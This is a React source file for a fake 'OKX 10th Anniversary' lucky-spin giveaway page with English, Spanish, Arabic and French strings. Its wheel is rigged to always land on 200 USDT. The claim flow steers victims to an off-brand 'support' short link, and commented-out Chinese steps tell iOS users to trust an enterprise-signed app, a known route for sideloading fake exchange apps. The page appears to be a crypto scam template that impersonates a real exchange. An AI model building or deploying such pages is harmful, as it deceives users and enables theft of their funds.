import React, { useMemo, useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
  Globe2,
  Headphones,
  Download,
  Gift,
  Wallet,
  ChevronRight,
  Smartphone,
  Trophy,
} from "lucide-react";

const SERVICE_URL = "https://hw.url668.com/s/GXQm1RWRc";

const DOWNLOAD_LINKS = {
  ios: "https://www.okx.com/download",
  android: "https://www.okx.com/download",
  default: "https://www.okx.com/download",
};

const PRIZES = [
  { label: "0",    value: "0 USDT",    color: "#111",    textColor: "#555" },
  { label: "50",   value: "50 USDT",   color: "#00f5c4", textColor: "#000" },
  { label: "100",  value: "100 USDT",  color: "#111",    textColor: "#fff" },
  { label: "200",  value: "200 USDT",  color: "#00f5c4", textColor: "#000" },
  { label: "500",  value: "500 USDT",  color: "#111",    textColor: "#fff" },
  { label: "1000", value: "1000 USDT", color: "#00f5c4", textColor: "#000" },
  { label: "2000", value: "2000 USDT", color: "#111",    textColor: "#fff" },
  { label: "5000", value: "5000 USDT", color: "#00f5c4", textColor: "#000" },
];

const i18n = {
  // zh: {
  //   activityTitle: "OKX十周年活动",
  //   heroTitle: "幸运转盘抽奖",
  //   heroDesc: "完成下载与收款地址提交，即可参与幸运奖金提取流程。",
  //   spinNow: "立即抽奖",
  //   youWon: "恭喜中奖！",
  //   wonDesc: "您的幸运奖励已锁定，请立即领取！",
  //   claimNow: "立即领取",
  //   page2Title: "下载OKX 提交USDT收款地址，提取幸运奖金",
  //   oneStep: "One step away from withdrawal $200.0",
  //   step1: "第一步",
  //   step1Title: "下载 OKX App",
  //   step1Desc: "",
  //   step2: "第二步",
  //   step2Title: "打开手机「设置」>「通用」>「VPN 与设备管理」。",
  //   step2Desc: "",
  //   step3: "第三步",
  //   step3Title: "在“企业级App”下方，选择「信任」该App。",
  //   step3Desc: "如遇到下载、地址提交、奖金提取问题，可点击右下角客服。",
  //   downloadNow: "立刻下载OKX",
  //   addressLabel: "USDT收款地址",
  //   addressPlaceholder: "请输入 USDT 收款地址",
  //   submit: "提交地址",
  //   submitted: "已提交，请联系在线客服确认",
  //   customerService: "在线客服",
  //   disclaimer:
  //     "安全提示：请勿提交私钥、助记词或交易所登录密码。活动页面请确保通过官方或授权渠道发布。",
  // },
  en: {
    activityTitle: "OKX 10th Anniversary Event",
    heroTitle: "Lucky Spin Rewards",
    heroDesc:
      "Download the app and submit your USDT receiving address to continue the reward withdrawal flow.",
    spinNow: "Spin Now",
    youWon: "Congratulations!",
    wonDesc: "Your lucky reward is confirmed. Claim it now!",
    claimNow: "Claim Now",
    page2Title:
      "Download OKX, submit USDT receiving address, and claim your lucky reward",
    oneStep: "One step away from withdrawal $200.0",
    step1: "Step 1",
    step1Title: "Download OKX App",
    step1Desc: "",
    step2: "Step 2",
    step2Title: "Submit USDT receiving address",
    step2Desc:"",
    step3: "Step 3",
    step3Title: "Contact online support",
    step3Desc:
      "Need help with download, address submission, or reward confirmation? Tap support.",
    downloadNow: "Download OKX Now",
    addressLabel: "USDT receiving address",
    addressPlaceholder: "Enter USDT receiving address",
    submit: "Submit Address",
    submitted: "Submitted. Please contact online support.",
    customerService: "Support",
    disclaimer:
      "Security notice: never submit private keys, seed phrases, or exchange login passwords.",
  },
  es: {
    activityTitle: "Evento del 10.º aniversario de OKX",
    heroTitle: "Ruleta de premios",
    heroDesc:
      "Descarga la app y envía tu dirección USDT para continuar con el retiro del premio.",
    spinNow: "Girar ahora",
    youWon: "¡Felicidades!",
    wonDesc: "Tu premio está confirmado. ¡Reclámalo ahora!",
    claimNow: "Reclamar ahora",
    page2Title: "Descarga OKX, envía tu dirección USDT y reclama tu premio",
    oneStep: "One step away from withdrawal $200.0",
    step1: "Paso 1",
    step1Title: "Descargar OKX App",
    step1Desc:"",
    step2: "Paso 2",
    step2Title: "Enviar dirección USDT",
    step2Desc:"",
    step3: "Paso 3",
    step3Title: "Contactar soporte",
    step3Desc:
      "Si necesitas ayuda, toca el botón de soporte en la esquina inferior derecha.",
    downloadNow: "Descargar OKX ahora",
    addressLabel: "Dirección USDT",
    addressPlaceholder: "Introduce la dirección USDT",
    submit: "Enviar dirección",
    submitted: "Enviado. Contacta soporte en línea.",
    customerService: "Soporte",
    disclaimer:
      "Aviso de seguridad: nunca envíes claves privadas, frases semilla ni contraseñas.",
  },
  ar: {
    activityTitle: "فعالية الذكرى العاشرة لـ OKX",
    heroTitle: "عجلة الحظ",
    heroDesc:
      "قم بتنزيل التطبيق وإرسال عنوان استلام USDT لمتابعة عملية سحب المكافأة.",
    spinNow: "ابدأ الآن",
    youWon: "تهانيّ!",
    wonDesc: "تم تأكيد جائزتك. اطلبها الآن!",
    claimNow: "استلم الآن",
    page2Title: "قم بتنزيل OKX وأرسل عنوان USDT لاستلام الجائزة",
    oneStep: "One step away from withdrawal $200.0",
    step1: "الخطوة 1",
    step1Title: "تنزيل تطبيق OKX",
    step1Desc: "",
    step2: "الخطوة 2",
    step2Title: "إرسال عنوان USDT",
    step2Desc:"",
    step3: "الخطوة 3",
    step3Title: "التواصل مع الدعم",
    step3Desc: "للمساعدة في التنزيل أو العنوان أو المكافأة، اضغط زر الدعم.",
    downloadNow: "تنزيل OKX الآن",
    addressLabel: "عنوان USDT",
    addressPlaceholder: "أدخل عنوان استلام USDT",
    submit: "إرسال العنوان",
    submitted: "تم الإرسال. يرجى التواصل مع الدعم.",
    customerService: "الدعم",
    disclaimer:
      "تنبيه أمني: لا ترسل المفاتيح الخاصة أو العبارات السرية أو كلمات المرور.",
  },
  fr: {
    activityTitle: "Événement 10e anniversaire OKX",
    heroTitle: "Roue de la chance",
    heroDesc:
      "Téléchargez l'app et soumettez votre adresse USDT pour continuer le retrait de la récompense.",
    spinNow: "Tourner",
    youWon: "Félicitations !",
    wonDesc: "Votre récompense est confirmée. Réclamez-la maintenant !",
    claimNow: "Réclamer",
    page2Title:
      "Téléchargez OKX, soumettez votre adresse USDT et réclamez votre récompense",
    oneStep: "One step away from withdrawal $200.0",
    step1: "Étape 1",
    step1Title: "Télécharger l'app OKX",
    step1Desc: "",
    step2: "Étape 2",
    step2Title: "Soumettre l'adresse USDT",
    step2Desc:"",
    step3: "Étape 3",
    step3Title: "Contacter le support",
    step3Desc: "Besoin d'aide ? Appuyez sur le bouton support en bas à droite.",
    downloadNow: "Télécharger OKX",
    addressLabel: "Adresse USDT",
    addressPlaceholder: "Entrez l'adresse USDT",
    submit: "Soumettre",
    submitted: "Soumis. Contactez le support en ligne.",
    customerService: "Support",
    disclaimer:
      "Avis de sécurité : ne soumettez jamais de clés privées, phrases seed ou mots de passe.",
  },
};

const LANG_STORAGE_KEY = "okx-lottery-lang";
const LANG_MANUAL_KEY = "okx-lottery-lang-manual";
const SUPPORTED_LANGS = ["en", "es", "ar", "fr"];

/** 根据设备/浏览器语言偏好匹配支持的语言 */
function getDeviceLang() {
  const locales = [
    ...(typeof navigator !== "undefined" && navigator.languages?.length
      ? navigator.languages
      : []),
    typeof navigator !== "undefined" ? navigator.language : "",
    "en",
  ]
    .filter(Boolean)
    .map((l) => String(l).toLowerCase());

  for (const locale of locales) {
    const base = locale.split("-")[0];
    if (base === "zh" || locale.startsWith("zh")) return "zh";
    if (base === "es" || locale.startsWith("es")) return "es";
    if (base === "ar" || locale.startsWith("ar")) return "ar";
    if (base === "fr" || locale.startsWith("fr")) return "fr";
    if (base === "en" || locale.startsWith("en")) return "en";
  }
  return "en";
}

/** 用户手动选过语言则用缓存，否则跟随当前设备语言 */
function getInitialLang() {
  try {
    const saved = localStorage.getItem(LANG_STORAGE_KEY);
    const manual = localStorage.getItem(LANG_MANUAL_KEY);
    const hasManualChoice =
      manual === "1" || (manual === null && saved && SUPPORTED_LANGS.includes(saved));
    if (hasManualChoice && saved && SUPPORTED_LANGS.includes(saved)) return saved;
  } catch {
    // private mode / storage disabled
  }
  return getDeviceLang();
}

function persistLang(lang) {
  try {
    localStorage.setItem(LANG_STORAGE_KEY, lang);
    localStorage.setItem(LANG_MANUAL_KEY, "1");
  } catch {
    // ignore
  }
}

function getDeviceDownloadLink() {
  const ua = navigator.userAgent.toLowerCase();
  if (/iphone|ipad|ipod/.test(ua)) return DOWNLOAD_LINKS.ios;
  if (/android/.test(ua)) return DOWNLOAD_LINKS.android;
  return DOWNLOAD_LINKS.default;
}

function OkxLogo({ small = false }) {
  return (
    <div className={small ? "okx-logo small" : "okx-logo"}>
      <div className="okx-grid">
        {Array.from({ length: 9 }).map((_, i) => (
          <span key={i} className={[1, 3, 4, 5, 7].includes(i) ? "active" : ""} />
        ))}
      </div>
    </div>
  );
}

function IOSIcon() {
  return (
    <div className="ios-icon">
      <span></span>
    </div>
  );
}

function LangSelect({ lang, onLangChange }) {
  return (
    <div className="lang-select">
      <Globe2 size={15} />
      <select value={lang} onChange={(e) => onLangChange(e.target.value)} aria-label="Language">
        <option value="en">English</option>
        <option value="es">Español</option>
        <option value="ar">العربية</option>
        <option value="fr">Français</option>
        {/* <option value="zh">中文</option> */}
      </select>
    </div>
  );
}

function Page1Bg() {
  return (
    <svg
      className="page-bg"
      viewBox="0 0 1440 900"
      preserveAspectRatio="xMidYMid slice"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <defs>
        <radialGradient id="p1-cg" cx="50%" cy="50%" r="50%">
          <stop offset="0%" stopColor="#00f5c4" stopOpacity="0.13" />
          <stop offset="100%" stopColor="#00f5c4" stopOpacity="0" />
        </radialGradient>
      </defs>

      <rect width="1440" height="900" fill="url(#p1-cg)" />

      {/* Concentric rings — centered on viewport, visible on both PC and mobile */}
      <circle cx="720" cy="450" r="200" fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="1" />
      <circle cx="720" cy="450" r="330" fill="none" stroke="rgba(0,245,196,0.07)" strokeWidth="0.9" />
      <circle cx="720" cy="450" r="470" fill="none" stroke="rgba(0,245,196,0.05)" strokeWidth="0.8" />
      <circle cx="720" cy="450" r="620" fill="none" stroke="rgba(0,245,196,0.03)" strokeWidth="0.7" />
      <circle cx="720" cy="450" r="780" fill="none" stroke="rgba(0,245,196,0.015)" strokeWidth="0.6" />

      {/* Long diagonal lines spanning full width */}
      <line x1="0" y1="260" x2="380" y2="0" stroke="rgba(0,245,196,0.06)" strokeWidth="1" />
      <line x1="1060" y1="900" x2="1440" y2="580" stroke="rgba(0,245,196,0.06)" strokeWidth="1" />
      <line x1="0" y1="720" x2="200" y2="900" stroke="rgba(255,255,255,0.03)" strokeWidth="1" />
      <line x1="1240" y1="0" x2="1440" y2="200" stroke="rgba(255,255,255,0.03)" strokeWidth="1" />

      {/* Left wing decoratives (x < 505, PC-only) */}
      <polygon points="50,66 64,80 50,94 36,80" fill="none" stroke="rgba(0,245,196,0.28)" strokeWidth="0.9" />
      <polygon points="140,808 152,822 140,836 128,822" fill="none" stroke="rgba(255,255,255,0.1)" strokeWidth="0.8" />
      <line x1="42" y1="716" x2="42" y2="728" stroke="rgba(0,245,196,0.28)" strokeWidth="1.2" />
      <line x1="36" y1="722" x2="48" y2="722" stroke="rgba(0,245,196,0.28)" strokeWidth="1.2" />
      <line x1="300" y1="820" x2="300" y2="830" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <line x1="295" y1="825" x2="305" y2="825" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <circle cx="22" cy="476" r="2.5" fill="rgba(0,245,196,0.32)" />
      <circle cx="22" cy="476" r="5.5" fill="rgba(0,245,196,0.1)" />
      <circle cx="200" cy="140" r="1.8" fill="rgba(0,245,196,0.24)" />
      <circle cx="400" cy="860" r="1.5" fill="rgba(0,245,196,0.2)" />

      {/* Right wing decoratives (x > 935, PC-only) */}
      <polygon points="1378,58 1392,72 1378,86 1364,72" fill="none" stroke="rgba(0,245,196,0.28)" strokeWidth="0.9" />
      <polygon points="1288,836 1300,850 1288,864 1276,850" fill="none" stroke="rgba(0,245,196,0.22)" strokeWidth="0.9" />
      <line x1="1398" y1="454" x2="1398" y2="466" stroke="rgba(0,245,196,0.24)" strokeWidth="1.1" />
      <line x1="1392" y1="460" x2="1404" y2="460" stroke="rgba(0,245,196,0.24)" strokeWidth="1.1" />
      <line x1="1190" y1="756" x2="1190" y2="766" stroke="rgba(255,255,255,0.12)" strokeWidth="1" />
      <line x1="1185" y1="761" x2="1195" y2="761" stroke="rgba(255,255,255,0.12)" strokeWidth="1" />
      <circle cx="1422" cy="240" r="2.5" fill="rgba(0,245,196,0.35)" />
      <circle cx="1422" cy="240" r="5.5" fill="rgba(0,245,196,0.12)" />
      <circle cx="1210" cy="820" r="2" fill="rgba(0,245,196,0.26)" />
      <circle cx="1020" cy="870" r="1.5" fill="rgba(0,245,196,0.2)" />

      {/* Center-zone decoratives (x 505–935, visible on mobile too) */}
      <polygon points="540,64 552,78 540,92 528,78" fill="none" stroke="rgba(0,245,196,0.2)" strokeWidth="0.8" />
      <polygon points="882,822 894,836 882,850 870,836" fill="none" stroke="rgba(0,245,196,0.2)" strokeWidth="0.8" />
      <line x1="546" y1="836" x2="546" y2="846" stroke="rgba(0,245,196,0.22)" strokeWidth="1" />
      <line x1="541" y1="841" x2="551" y2="841" stroke="rgba(0,245,196,0.22)" strokeWidth="1" />
      <line x1="898" y1="60" x2="898" y2="70" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <line x1="893" y1="65" x2="903" y2="65" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <circle cx="518" cy="450" r="2" fill="rgba(0,245,196,0.26)" />
      <circle cx="922" cy="450" r="2" fill="rgba(0,245,196,0.26)" />
    </svg>
  );
}

function hexPoints(cx, cy, r) {
  const pts = [];
  for (let i = 0; i < 6; i++) {
    const a = (Math.PI / 3) * i - Math.PI / 6;
    pts.push(`${(cx + r * Math.cos(a)).toFixed(1)},${(cy + r * Math.sin(a)).toFixed(1)}`);
  }
  return pts.join(" ");
}

function Page2Bg() {
  return (
    <svg
      className="page-bg"
      viewBox="0 0 1440 900"
      preserveAspectRatio="xMidYMid slice"
      xmlns="http://www.w3.org/2000/svg"
      aria-hidden="true"
    >
      <defs>
        <radialGradient id="p2-g1" cx="12%" cy="18%" r="48%">
          <stop offset="0%" stopColor="#00f5c4" stopOpacity="0.12" />
          <stop offset="100%" stopColor="#00f5c4" stopOpacity="0" />
        </radialGradient>
        <radialGradient id="p2-g2" cx="88%" cy="82%" r="42%">
          <stop offset="0%" stopColor="#ffffff" stopOpacity="0.05" />
          <stop offset="100%" stopColor="#ffffff" stopOpacity="0" />
        </radialGradient>
      </defs>

      <rect width="1440" height="900" fill="url(#p2-g1)" />
      <rect width="1440" height="900" fill="url(#p2-g2)" />

      {/* Large hexagon cluster — top-right (PC) */}
      <polygon points={hexPoints(1280, 76, 210)} fill="none" stroke="rgba(0,245,196,0.07)" strokeWidth="1" />
      <polygon points={hexPoints(1280, 76, 148)} fill="none" stroke="rgba(0,245,196,0.05)" strokeWidth="0.9" />
      <polygon points={hexPoints(1280, 76, 88)} fill="none" stroke="rgba(0,245,196,0.07)" strokeWidth="0.8" />

      {/* Network cluster — left (PC) */}
      <circle cx="118" cy="348" r="4" fill="rgba(0,245,196,0.36)" />
      <circle cx="118" cy="348" r="9" fill="rgba(0,245,196,0.1)" />
      <circle cx="216" cy="288" r="2.5" fill="rgba(0,245,196,0.26)" />
      <circle cx="78" cy="458" r="2.5" fill="rgba(0,245,196,0.22)" />
      <circle cx="196" cy="428" r="2" fill="rgba(0,245,196,0.2)" />
      <circle cx="308" cy="308" r="2" fill="rgba(0,245,196,0.18)" />
      <circle cx="350" cy="408" r="1.8" fill="rgba(0,245,196,0.15)" />
      <line x1="118" y1="348" x2="216" y2="288" stroke="rgba(0,245,196,0.1)" strokeWidth="0.9" />
      <line x1="118" y1="348" x2="78" y2="458" stroke="rgba(0,245,196,0.09)" strokeWidth="0.9" />
      <line x1="118" y1="348" x2="196" y2="428" stroke="rgba(0,245,196,0.09)" strokeWidth="0.8" />
      <line x1="216" y1="288" x2="308" y2="308" stroke="rgba(0,245,196,0.07)" strokeWidth="0.8" />
      <line x1="196" y1="428" x2="350" y2="408" stroke="rgba(0,245,196,0.07)" strokeWidth="0.7" />
      <line x1="78" y1="458" x2="196" y2="428" stroke="rgba(0,245,196,0.06)" strokeWidth="0.7" />

      {/* Network cluster — right (PC) */}
      <circle cx="1322" cy="596" r="3.5" fill="rgba(0,245,196,0.3)" />
      <circle cx="1322" cy="596" r="8" fill="rgba(0,245,196,0.09)" />
      <circle cx="1392" cy="658" r="2.5" fill="rgba(0,245,196,0.22)" />
      <circle cx="1248" cy="648" r="2.5" fill="rgba(0,245,196,0.2)" />
      <circle cx="1362" cy="718" r="2" fill="rgba(0,245,196,0.18)" />
      <circle cx="1430" cy="590" r="1.8" fill="rgba(0,245,196,0.16)" />
      <line x1="1322" y1="596" x2="1392" y2="658" stroke="rgba(0,245,196,0.1)" strokeWidth="0.9" />
      <line x1="1322" y1="596" x2="1248" y2="648" stroke="rgba(0,245,196,0.09)" strokeWidth="0.9" />
      <line x1="1392" y1="658" x2="1362" y2="718" stroke="rgba(0,245,196,0.08)" strokeWidth="0.8" />
      <line x1="1322" y1="596" x2="1430" y2="590" stroke="rgba(0,245,196,0.07)" strokeWidth="0.7" />

      {/* Center-zone hexagons (visible on mobile x:505–935) */}
      <polygon points={hexPoints(720, 826, 34)} fill="none" stroke="rgba(0,245,196,0.12)" strokeWidth="0.9" />
      <polygon points={hexPoints(580, 96, 28)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.8" />
      <polygon points={hexPoints(858, 116, 24)} fill="none" stroke="rgba(255,255,255,0.09)" strokeWidth="0.8" />
      <polygon points={hexPoints(562, 782, 19)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.7" />
      <polygon points={hexPoints(876, 782, 19)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.7" />

      {/* Left-edge hexagons (PC) */}
      <polygon points={hexPoints(198, 708, 32)} fill="none" stroke="rgba(0,245,196,0.12)" strokeWidth="0.8" />
      <polygon points={hexPoints(376, 826, 22)} fill="none" stroke="rgba(255,255,255,0.09)" strokeWidth="0.7" />
      <polygon points={hexPoints(50, 146, 22)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.7" />

      {/* Right-edge hexagons (PC) */}
      <polygon points={hexPoints(1098, 806, 30)} fill="none" stroke="rgba(0,245,196,0.11)" strokeWidth="0.8" />
      <polygon points={hexPoints(1238, 784, 21)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.7" />
      <polygon points={hexPoints(1390, 826, 18)} fill="none" stroke="rgba(0,245,196,0.1)" strokeWidth="0.7" />

      {/* Diagonal accent lines */}
      <line x1="0" y1="540" x2="180" y2="720" stroke="rgba(0,245,196,0.05)" strokeWidth="1" />
      <line x1="480" y1="0" x2="680" y2="200" stroke="rgba(0,245,196,0.05)" strokeWidth="1" />
      <line x1="1262" y1="0" x2="1440" y2="178" stroke="rgba(0,245,196,0.05)" strokeWidth="1" />
      <line x1="1080" y1="900" x2="1260" y2="720" stroke="rgba(0,245,196,0.04)" strokeWidth="1" />

      {/* Diamond shapes */}
      <polygon points="34,478 46,490 34,502 22,490" fill="none" stroke="rgba(0,245,196,0.24)" strokeWidth="0.8" />
      <polygon points="1406,376 1418,388 1406,400 1394,388" fill="none" stroke="rgba(0,245,196,0.22)" strokeWidth="0.8" />
      <polygon points="672,44 682,54 672,64 662,54" fill="none" stroke="rgba(0,245,196,0.18)" strokeWidth="0.8" />
      <polygon points="762,848 772,858 762,868 752,858" fill="none" stroke="rgba(0,245,196,0.18)" strokeWidth="0.8" />
      <polygon points="200,62 210,72 200,82 190,72" fill="none" stroke="rgba(255,255,255,0.12)" strokeWidth="0.8" />
      <polygon points="1238,830 1248,840 1238,850 1228,840" fill="none" stroke="rgba(255,255,255,0.1)" strokeWidth="0.8" />

      {/* Plus marks */}
      <line x1="378" y1="158" x2="378" y2="168" stroke="rgba(0,245,196,0.22)" strokeWidth="1.1" />
      <line x1="373" y1="163" x2="383" y2="163" stroke="rgba(0,245,196,0.22)" strokeWidth="1.1" />
      <line x1="1062" y1="742" x2="1062" y2="752" stroke="rgba(0,245,196,0.2)" strokeWidth="1.1" />
      <line x1="1057" y1="747" x2="1067" y2="747" stroke="rgba(0,245,196,0.2)" strokeWidth="1.1" />
      <line x1="682" y1="828" x2="682" y2="838" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <line x1="677" y1="833" x2="687" y2="833" stroke="rgba(0,245,196,0.2)" strokeWidth="1" />
      <line x1="48" y1="168" x2="48" y2="176" stroke="rgba(255,255,255,0.12)" strokeWidth="1" />
      <line x1="44" y1="172" x2="52" y2="172" stroke="rgba(255,255,255,0.12)" strokeWidth="1" />

      {/* Glow dots */}
      <circle cx="18" cy="638" r="2.5" fill="rgba(0,245,196,0.3)" />
      <circle cx="18" cy="638" r="6" fill="rgba(0,245,196,0.09)" />
      <circle cx="1422" cy="258" r="2" fill="rgba(255,255,255,0.2)" />
      <circle cx="720" cy="28" r="2" fill="rgba(0,245,196,0.22)" />
      <circle cx="460" cy="870" r="1.5" fill="rgba(0,245,196,0.18)" />
    </svg>
  );
}

const R = 125;
const CX = 143;
const CY = 143;

function Wheel({ totalRotation }) {
  return (
    <div className="wheel-outer">
      <div className="wheel-pointer-triangle" />
      <div
        className="wheel-spinning-div"
        style={{
          transform: `rotate(${totalRotation}deg)`,
          transition: "transform 4.5s cubic-bezier(0.17, 0.67, 0.12, 0.99)",
        }}
      >
        <svg width="286" height="286" viewBox="0 0 286 286">
          <defs>
            <linearGradient id="ringGrad" x1="0%" y1="0%" x2="100%" y2="100%">
              <stop offset="0%" stopColor="#00f5c4" />
              <stop offset="50%" stopColor="#ffffff" />
              <stop offset="100%" stopColor="#00f5c4" />
            </linearGradient>
          </defs>
          <circle cx={CX} cy={CY} r={R + 8} fill="url(#ringGrad)" />
          {PRIZES.map((prize, i) => {
            const sa = (i * 45 - 90) * (Math.PI / 180);
            const ea = ((i + 1) * 45 - 90) * (Math.PI / 180);
            const x1 = (CX + R * Math.cos(sa)).toFixed(3);
            const y1 = (CY + R * Math.sin(sa)).toFixed(3);
            const x2 = (CX + R * Math.cos(ea)).toFixed(3);
            const y2 = (CY + R * Math.sin(ea)).toFixed(3);
            const d = `M ${CX} ${CY} L ${x1} ${y1} A ${R} ${R} 0 0 1 ${x2} ${y2} Z`;
            const rot = i * 45 + 22.5;
            const fs = prize.label.length >= 4 ? "11" : "13";
            return (
              <g key={i}>
                <path d={d} fill={prize.color} stroke="#1a1a1a" strokeWidth="1.5" />
                <g transform={`rotate(${rot}, ${CX}, ${CY})`}>
                  <text
                    x={CX}
                    y={CY - R * 0.6}
                    fill={prize.textColor}
                    fontSize={fs}
                    fontWeight="900"
                    textAnchor="middle"
                    dominantBaseline="middle"
                    style={{ userSelect: "none", pointerEvents: "none" }}
                  >
                    {prize.label}
                  </text>
                  <text
                    x={CX}
                    y={CY - R * 0.6 + 14}
                    fill={prize.textColor}
                    fontSize="8"
                    fontWeight="700"
                    textAnchor="middle"
                    dominantBaseline="middle"
                    opacity="0.8"
                    style={{ userSelect: "none", pointerEvents: "none" }}
                  >
                    USDT
                  </text>
                </g>
              </g>
            );
          })}
          <circle cx={CX} cy={CY} r="42" fill="#050505" stroke="#fff" strokeWidth="3.5" />
          <circle cx={CX} cy={CY} r="35" fill="#000" />
          <text
            x={CX}
            y={CY}
            fill="#fff"
            fontSize="14"
            fontWeight="900"
            textAnchor="middle"
            dominantBaseline="middle"
            style={{ userSelect: "none" }}
          >
            OKX
          </text>
        </svg>
      </div>
    </div>
  );
}

function WinModal({ prize, t, onClaim }) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="modal-overlay"
    >
      <motion.div
        initial={{ scale: 0.6, opacity: 0, y: 50 }}
        animate={{ scale: 1, opacity: 1, y: 0 }}
        exit={{ scale: 0.7, opacity: 0, y: 30 }}
        transition={{ type: "spring", duration: 0.55, bounce: 0.35 }}
        className="modal-box"
      >
        <div className="modal-icon-wrap">
          <Trophy size={40} color="#00f5c4" />
        </div>
        <h2 className="modal-title">{t.youWon}</h2>
        <div className="modal-prize-amount">{prize.value}</div>
        <p className="modal-desc">{t.wonDesc}</p>
        <motion.button
          whileTap={{ scale: 0.97 }}
          onClick={onClaim}
          className="primary-btn modal-claim-btn"
        >
          <Gift size={20} />
          {t.claimNow}
          <ChevronRight size={20} />
        </motion.button>
      </motion.div>
    </motion.div>
  );
}

function PageOne({ t, onNext }) {
  const [totalRotation, setTotalRotation] = useState(0);
  const [spinning, setSpinning] = useState(false);
  const [winner, setWinner] = useState(null);

  function handleSpin() {
    if (spinning || winner) return;
    // indices 1-7: always land on a non-zero prize
    const idx = 3; // always land on 200 USDT
    const newRotation = 6 * 360 - idx * 45 - 22.5;
    setTotalRotation(newRotation);
    setSpinning(true);
    setTimeout(() => {
      setSpinning(false);
      setWinner(PRIZES[idx]);
    }, 4500);
  }

  const btnDisabled = spinning || !!winner;

  return (
    <motion.section
      key="page1"
      initial={{ opacity: 0, y: 22 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -22 }}
      className="page"
    >
      <div className="container center">
        <div className="brand-row">
          <OkxLogo />
          <div className="brand-pill">{t.activityTitle}</div>
        </div>

        <h1 className="hero-title">{t.heroTitle}</h1>
        <p className="hero-desc">{t.heroDesc}</p>

        <Wheel totalRotation={totalRotation} />

        <motion.button
          whileTap={!btnDisabled ? { scale: 0.97 } : {}}
          onClick={handleSpin}
          disabled={btnDisabled}
          className={`primary-btn${btnDisabled ? " btn-disabled" : ""}`}
        >
          <Gift size={20} />
          {t.spinNow}
          <ChevronRight size={20} />
        </motion.button>
      </div>

      <AnimatePresence>
        {winner && <WinModal prize={winner} t={t} onClaim={onNext} />}
      </AnimatePresence>
    </motion.section>
  );
}

function StepCard({ icon, tag, title, desc }) {
  return (
    <div className="step-card">
      <div className="step-icon">{icon}</div>
      <div>
        <div className="step-tag">{tag}</div>
        <h3>{title}</h3>
        <p>{desc}</p>
      </div>
    </div>
  );
}

function PageTwo({ t }) {
  const [address, setAddress] = useState("");
  const [submitted, setSubmitted] = useState(false);

  function handleDownload() {
    window.open(getDeviceDownloadLink(), "_blank", "noopener,noreferrer");
  }

  function handleSubmit(e) {
    e.preventDefault();
    if (!address.trim()) return;
    setSubmitted(true);
  }

  return (
    <motion.section
      key="page2"
      initial={{ opacity: 0, y: 22 }}
      animate={{ opacity: 1, y: 0 }}
      exit={{ opacity: 0, y: -22 }}
      className="page"
    >
      <div className="container">
        <div className="top-card">
          <div className="top-card-head">
            <OkxLogo />
            <div>
              <div className="mini-title">{t.activityTitle}</div>
              <h1>{t.page2Title}</h1>
            </div>
          </div>

          <div className="amount-box">
            <div>{t.oneStep}</div>
            <strong>$200</strong>
          </div>
        </div>

        <div className="steps">
          <StepCard
            icon={<Download size={22} />}
            tag={t.step1}
            title={t.step1Title}
            desc={t.step1Desc}
          />
          <StepCard
            icon={<Wallet size={22} />}
            tag={t.step2}
            title={t.step2Title}
            desc={t.step2Desc}
          />
          <StepCard
            icon={<Headphones size={22} />}
            tag={t.step3}
            title={t.step3Title}
            desc={t.step3Desc}
          />
        </div>

        <button onClick={handleDownload} className="download-btn">
          <IOSIcon />
          <OkxLogo small />
          <span>{t.downloadNow}</span>
        </button>

        {/* <form onSubmit={handleSubmit} className="address-form">
          <label>{t.addressLabel}</label>
          <input
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            placeholder={t.addressPlaceholder}
          />
          <button type="submit">{submitted ? t.submitted : t.submit}</button>
        </form> */}

        <p className="disclaimer">{t.disclaimer}</p>
      </div>
    </motion.section>
  );
}

export default function App() {
  const [page, setPage] = useState(1);
  const [lang, setLang] = useState(getInitialLang);

  const handleLangChange = (nextLang) => {
    if (!SUPPORTED_LANGS.includes(nextLang)) return;
    setLang(nextLang);
    persistLang(nextLang);
  };

  const t = useMemo(() => i18n[lang] || i18n.en, [lang]);
  const isRtl = lang === "ar";

  return (
    <main dir={isRtl ? "rtl" : "ltr"} className="app">
      <div className="bg-layer">
        <div className="glow glow-left" />
        <div className="glow glow-right" />
      </div>

      <AnimatePresence>
        {page === 1
          ? <motion.div key="bg1" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.5 }} className="page-bg-layer"><Page1Bg /></motion.div>
          : <motion.div key="bg2" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.5 }} className="page-bg-layer"><Page2Bg /></motion.div>
        }
      </AnimatePresence>

      <LangSelect lang={lang} onLangChange={handleLangChange} />

      <AnimatePresence mode="wait">
        {page === 1 ? <PageOne t={t} onNext={() => setPage(2)} /> : <PageTwo t={t} />}
      </AnimatePresence>

      <a
        href={SERVICE_URL}
        target="_blank"
        rel="noreferrer"
        aria-label={t.customerService}
        className="service-btn"
      >
        <Headphones size={29} />
      </a>

      <div className="mobile-note">
        <Smartphone size={14} />
        Mobile first layout
      </div>
    </main>
  );
}
